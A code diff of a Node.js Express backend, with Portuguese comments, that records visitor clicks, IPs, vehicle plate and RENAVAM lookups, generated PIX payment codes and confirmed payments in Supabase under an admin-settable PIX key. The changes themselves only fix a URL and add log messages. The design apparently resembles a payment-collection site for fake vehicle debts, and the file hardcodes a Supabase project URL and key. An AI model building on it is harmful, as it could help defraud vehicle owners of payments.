@@ -12,8 +12,8 @@ const { createClient } = require('@supabase/supabase-js');
 const app = express();
 const PORT = process.env.PORT || 3001;
 
-// 🔥 CONFIGURAÇÃO DO SUPABASE
-const SUPABASE_URL = 'https://wpmvbvbrsggkbaycpvlq.supabase.co';
+// 🔥 CONFIGURAÇÃO CORRETA DO SUPABASE
+const SUPABASE_URL = 'https://wpmbvbgrsggkbaycpvlq.supabase.co';
 const SUPABASE_ANON_KEY = 'sb_publishable_7WuOJyAKV7E2tuim-6Sp7g_JPsVWMEf';
 const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
@@ -44,8 +44,9 @@ async function registrarClique(ip, userAgent, pagina) {
             user_agent: userAgent, 
             pagina 
         });
-        if (error) console.error('Erro Supabase (clique):', error.message);
-    } catch (e) { console.error('Erro ao registrar clique:', e.message); }
+        if (error) console.error('❌ Erro Supabase (clique):', error.message);
+        else console.log('✅ Clique salvo no Supabase!');
+    } catch (e) { console.error('❌ Erro ao registrar clique:', e.message); }
 }
 
 async function registrarConsulta(placa, renavam, ip, userAgent) {
@@ -56,9 +57,12 @@ async function registrarConsulta(placa, renavam, ip, userAgent) {
             ip, 
             user_agent: userAgent 
         });
-        if (error) console.error('Erro Supabase (consulta):', error.message);
-        else console.log('✅ Consulta salva no Supabase!');
-    } catch (e) { console.error('Erro ao registrar consulta:', e.message); }
+        if (error) {
+            console.error('❌ Erro Supabase (consulta):', error.message);
+        } else {
+            console.log('✅ Consulta salva no Supabase!');
+        }
+    } catch (e) { console.error('❌ Erro ao registrar consulta:', e.message); }
 }
 
 async function registrarPIXGerado(pixId, placa, valor, debitos, copiacola, ip, userAgent, chave) {
@@ -73,15 +77,15 @@ async function registrarPIXGerado(pixId, placa, valor, debitos, copiacola, ip, u
             user_agent: userAgent,
             chave_utilizada: chave
         });
-        if (error) console.error('Erro Supabase (PIX):', error.message);
-    } catch (e) { console.error('Erro ao registrar PIX:', e.message); }
+        if (error) console.error('❌ Erro Supabase (PIX):', error.message);
+    } catch (e) { console.error('❌ Erro ao registrar PIX:', e.message); }
 }
 
 async function marcarPIXCopiado(pixId) {
     try {
         const { error } = await supabase.from('pix_gerados').update({ copiado: true }).eq('pix_id', pixId);
-        if (error) console.error('Erro Supabase (copiar PIX):', error.message);
-    } catch (e) { console.error('Erro ao marcar PIX copiado:', e.message); }
+        if (error) console.error('❌ Erro Supabase (copiar PIX):', error.message);
+    } catch (e) { console.error('❌ Erro ao marcar PIX copiado:', e.message); }
 }
 
 async function marcarPagamentoConfirmado(pixId, placa, renavam, ip, userAgent) {
@@ -99,7 +103,8 @@ async function marcarPagamentoConfirmado(pixId, placa, renavam, ip, userAgent) {
             ip, 
             user_agent: userAgent 
         });
-    } catch (e) { console.error('Erro ao confirmar pagamento:', e.message); }
+        console.log('✅ Pagamento confirmado salvo no Supabase!');
+    } catch (e) { console.error('❌ Erro ao confirmar pagamento:', e.message); }
 }
 
 async function getConfigPIX() {
@@ -110,7 +115,7 @@ async function getConfigPIX() {
         }
         return data[0];
     } catch (e) {
-        console.error('Erro ao buscar config PIX:', e.message);
+        console.error('❌ Erro ao buscar config PIX:', e.message);
         return { nome: '', cidade: '', identificador: '', chave: '' };
     }
 }
@@ -123,7 +128,8 @@ async function setConfigPIX(nome, cidade, identificador, chave) {
         } else {
             await supabase.from('config_pix').insert({ nome, cidade, identificador, chave });
         }
-    } catch (e) { console.error('Erro ao salvar config PIX:', e.message); }
+        console.log('✅ Config PIX salva no Supabase!');
+    } catch (e) { console.error('❌ Erro ao salvar config PIX:', e.message); }
 }
 
 async function getDashboard() {
@@ -149,7 +155,7 @@ async function getDashboard() {
             valorTotalPago
         };
     } catch (e) {
-        console.error('Erro ao buscar dashboard:', e.message);
+        console.error('❌ Erro ao buscar dashboard:', e.message);
         return {
             totalClicks: 0,
             totalConsultas: 0,
